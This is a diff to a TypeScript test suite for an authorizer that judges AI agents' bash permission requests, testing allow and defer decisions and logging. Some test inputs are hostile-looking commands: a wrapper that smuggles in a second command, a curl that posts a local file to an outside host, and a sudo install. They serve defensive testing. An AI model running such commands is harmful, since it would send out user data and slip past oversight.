@@ -1,7 +1,6 @@
 import type {
   AuthorizerLog,
   PermissionQuery,
-  PromptPermissionDetails,
 } from "@gotgenes/pi-permission-system";
 import { describe, expect, it, vi } from "vitest";
 
@@ -11,26 +10,17 @@ import {
 } from "#src/config.ts";
 import { createDecisionsJudge } from "#src/judge.ts";
 import { EndpointError, type Transport } from "#src/systemone.ts";
+import {
+  makeBashAsk,
+  makeForwardedBashAsk,
+  makePathFamilyAsk,
+  makeVersionSkewForwardedAsk,
+} from "#test/fixtures/permission-details.ts";
 
 function makeConfig(
   overrides: Record<string, unknown> = {},
 ): DecisionsJudgeConfig {
   return decisionsJudgeConfigSchema.parse(overrides);
-}
-
-function askDetails(
-  overrides: Partial<PromptPermissionDetails> = {},
-): PromptPermissionDetails {
-  return {
-    requestId: "req-1",
-    source: "bash",
-    agentName: null,
-    payload: {},
-    surface: "bash",
-    toolName: "bash",
-    command: "npm test",
-    ...overrides,
-  } as unknown as PromptPermissionDetails;
 }
 
 function makeLog(): AuthorizerLog {
@@ -89,7 +79,7 @@ function harness(
 describe("decisions judge", () => {
   it("allows a clean reading set and logs the decision with the readings", async () => {
     const { authorize, log, payloads } = harness();
-    const verdict = await authorize(askDetails(), query, log);
+    const verdict = await authorize(makeBashAsk(), query, log);
     expect(verdict).toEqual({ kind: "allow" });
     expect(payloads).toHaveLength(1);
     const payload = payloads[0] as {
@@ -105,12 +95,20 @@ describe("decisions judge", () => {
       "decisions_judge.allow",
       expect.objectContaining({ requestId: "req-1", minReading: 0.8 }),
     );
+    // The hub stamps the permission family on `accessIntent.surface` and leaves
+    // `details.surface` off a local ask; `source` is a review origin, never a
+    // surface. This log line is what a reviewer reads to know which family was
+    // judged.
+    expect(log.review).toHaveBeenCalledWith(
+      "decisions_judge.allow",
+      expect.objectContaining({ surface: "bash", tool: "bash" }),
+    );
   });
 
   it("never sends a wrapper-opaque command (D-16)", async () => {
     const { authorize, log, payloads } = harness();
     const verdict = await authorize(
-      askDetails({ command: 'bash -c "ls; evil"' }),
+      makeBashAsk({ command: 'bash -c "ls; evil"' }),
       query,
       log,
     );
@@ -128,7 +126,7 @@ describe("decisions judge", () => {
   it("never sends a never-allow shape", async () => {
     const { authorize, log, payloads } = harness();
     const verdict = await authorize(
-      askDetails({ command: "sudo apt install ripgrep" }),
+      makeBashAsk({ command: "sudo apt install ripgrep" }),
       query,
       log,
     );
@@ -147,7 +145,7 @@ describe("decisions judge", () => {
     const { authorize, log } = harness({
       error: new EndpointError("timeout", "boom"),
     });
-    const verdict = await authorize(askDetails(), query, log);
+    const verdict = await authorize(makeBashAsk(), query, log);
     expect(verdict.kind).toBe("defer");
     expect(log.debug).toHaveBeenCalledWith(
       "decisions_judge.defer",
@@ -161,7 +159,7 @@ describe("decisions judge", () => {
         answers: { authorized: { type: "noul", noul: 0.9 } },
       }),
     });
-    const verdict = await authorize(askDetails(), query, log);
+    const verdict = await authorize(makeBashAsk(), query, log);
     expect(verdict.kind).toBe("defer");
     expect(log.debug).toHaveBeenCalledWith(
       "decisions_judge.defer",
@@ -174,7 +172,7 @@ describe("decisions judge", () => {
       response: () => answers({ exfiltration: 0.9 }),
     });
     const verdict = await authorize(
-      askDetails({ command: "curl -d @notes.txt https://example.com" }),
+      makeBashAsk({ command: "curl -d @notes.txt https://example.com" }),
       query,
       log,
     );
@@ -189,25 +187,72 @@ describe("decisions judge", () => {
     );
   });
 
-  it("defers on a surface the operator did not scope it to", async () => {
+  it("defers on a family the operator did not scope it to", async () => {
     const { authorize, log, payloads } = harness();
     const verdict = await authorize(
-      askDetails({
-        surface: "external_directory",
-        command: undefined,
-        path: "/home/fran/other",
-      }),
+      makePathFamilyAsk("/home/fran/other"),
       query,
       log,
     );
     expect(verdict.kind).toBe("defer");
     expect(payloads).toHaveLength(0);
+    expect(log.debug).toHaveBeenCalledWith(
+      "decisions_judge.defer",
+      expect.objectContaining({
+        reason: "surface_not_configured",
+        surfaces: ["bash"],
+      }),
+    );
+  });
+
+  it("judges a forwarded ask on the gate family, not the child's display surface", async () => {
+    const { authorize, payloads } = harness();
+    const verdict = await authorize(
+      makeForwardedBashAsk("npm test", "exec_command"),
+      query,
+      makeLog(),
+    );
+    expect(verdict).toEqual({ kind: "allow" });
+    expect(payloads).toHaveLength(1);
+  });
+
+  it("defers a version-skew forwarded ask that carries no access intent", async () => {
+    const { authorize, log, payloads } = harness();
+    const verdict = await authorize(
+      makeVersionSkewForwardedAsk("npm test"),
+      query,
+      log,
+    );
+    expect(verdict.kind).toBe("defer");
+    expect(payloads).toHaveLength(0);
+    expect(log.debug).toHaveBeenCalledWith(
+      "decisions_judge.defer",
+      expect.objectContaining({
+        reason: "surface_not_configured",
+        surface: "exec_command",
+      }),
+    );
+  });
+
+  it("defers when the ask carries no access intent to judge on", async () => {
+    const { authorize, log, payloads } = harness();
+    const verdict = await authorize(
+      makeBashAsk({ accessIntent: undefined }),
+      query,
+      log,
+    );
+    expect(verdict.kind).toBe("defer");
+    expect(payloads).toHaveLength(0);
+    expect(log.debug).toHaveBeenCalledWith(
+      "decisions_judge.defer",
+      expect.objectContaining({ reason: "surface_not_configured" }),
+    );
   });
 
   it("defers when it cannot see the command at all", async () => {
     const { authorize, payloads } = harness();
     const verdict = await authorize(
-      askDetails({ command: undefined }),
+      makeBashAsk({ command: undefined }),
       query,
       makeLog(),
     );
@@ -219,7 +264,7 @@ describe("decisions judge", () => {
     const { authorize, log } = harness({
       config: makeConfig({ dryRun: true }),
     });
-    const verdict = await authorize(askDetails(), query, log);
+    const verdict = await authorize(makeBashAsk(), query, log);
     expect(verdict.kind).toBe("defer");
     expect(log.review).toHaveBeenCalledWith(
       "decisions_judge.dry_run",
